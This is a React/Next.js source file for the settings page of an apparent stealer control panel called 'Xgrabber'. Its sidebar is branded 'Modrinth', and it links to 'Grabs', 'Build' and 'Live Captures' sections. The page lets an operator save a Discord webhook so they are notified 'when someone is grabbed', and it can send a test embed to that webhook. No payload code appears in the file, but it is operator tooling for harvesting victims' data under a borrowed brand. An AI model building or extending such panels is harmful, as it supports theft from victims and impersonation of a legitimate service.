'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

const colors = {
  bg: '#0a0a0f',
  panel: '#111218',
  border: '#1e1f28',
  text: '#ffffff',
  textDim: '#6b6e7b',
  green: '#22c55e',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '9px 14px', borderRadius: 8,
      background: active ? '#1a1b24' : 'transparent',
      color: active ? colors.text : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}>
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

export default function SettingsPage() {
  const router = useRouter();
  const [webhook, setWebhook] = useState('');
  const [saved, setSaved] = useState(false);
  const [userEmail, setUserEmail] = useState('');

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => {
        if (d.user?.email) {
          setUserEmail(d.user.email);
          return fetch(`/api/user/settings?email=${encodeURIComponent(d.user.email)}`);
        }
      })
      .then(r => r ? r.json() : null)
      .then(d => { if (d?.webhook_url) setWebhook(d.webhook_url); })
      .catch(() => {});
  }, []);

  const handleSave = async () => {
    const res = await fetch('/api/user/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: userEmail, webhook_url: webhook }),
    });
    if (res.ok) setSaved(true);
  };

  const handleTest = async () => {
    if (!webhook) return;
    try {
      await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: 'Xgrabber — Test',
            description: 'Webhook test successful!',
            color: 2201972,
            footer: { text: `Xgrabber · ${new Date().toLocaleString()}` },
          }],
        }),
      });
      alert('Test webhook sent!');
    } catch (e) {
      alert('Failed to send test webhook. Check the URL.');
    }
  };

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 200, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: '#222' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>Modrinth</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          <NavItem icon="📋" label="Plans" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⭐" label="+Rep" onClick={() => router.push('/dashboard')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
        </div>
        <div>
          <NavItem icon="⚙️" label="Settings" active onClick={() => {}} />
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>
      <div style={{ flex: 1, padding: '28px 36px' }}>
        <h1 style={{ fontSize: 24, fontWeight: 700, margin: '0 0 8px 0' }}>Settings</h1>
        <p style={{ color: colors.textDim, fontSize: 14, margin: '0 0 24px 0' }}>Configure your notifications and account.</p>

        <div style={{ background: colors.panel, borderRadius: 12, border: `1px solid ${colors.border}`, padding: 24, maxWidth: 600 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 16, fontSize: 14, fontWeight: 600, color: colors.text }}>
            <span>💬</span> Discord Webhook
          </div>
          <div style={{ fontSize: 13, color: colors.textDim, marginBottom: 12 }}>
            Get notified on Discord when someone is grabbed. You'll receive a "New Capture" or "Capture Updated" embed.
          </div>
          <div style={{ fontSize: 12, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8 }}>WEBHOOK URL</div>
          <div style={{ display: 'flex', gap: 8, marginBottom: 12 }}>
            <input
              type="url"
              value={webhook}
              onChange={e => { setWebhook(e.target.value); setSaved(false); }}
              placeholder="https://discord.com/api/webhooks/..."
              style={{ flex: 1, background: '#1a1b24', border: `1px solid ${colors.border}`, borderRadius: 8, padding: '10px 14px', color: colors.text, fontSize: 13, outline: 'none' }}
            />
            <button
              onClick={handleSave}
              disabled={!webhook}
              style={{ background: saved ? colors.green : 'transparent', color: saved ? '#000' : colors.textDim, border: `1px solid ${saved ? colors.green : colors.border}`, borderRadius: 8, padding: '10px 16px', fontSize: 13, fontWeight: 600, cursor: webhook ? 'pointer' : 'not-allowed' }}
            >
              {saved ? '✓ Saved' : 'Save'}
            </button>
          </div>
          <button
            onClick={handleTest}
            disabled={!webhook}
            style={{ background: 'transparent', border: `1px solid ${colors.border}`, color: webhook ? colors.text : '#555', borderRadius: 8, padding: '8px 16px', fontSize: 13, cursor: webhook ? 'pointer' : 'not-allowed' }}
          >
            Send Test Webhook
          </button>
          {saved && (
            <div style={{ marginTop: 10, fontSize: 12, color: colors.green }}>
              ✓ Webhook saved — you'll get notified on every grab
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
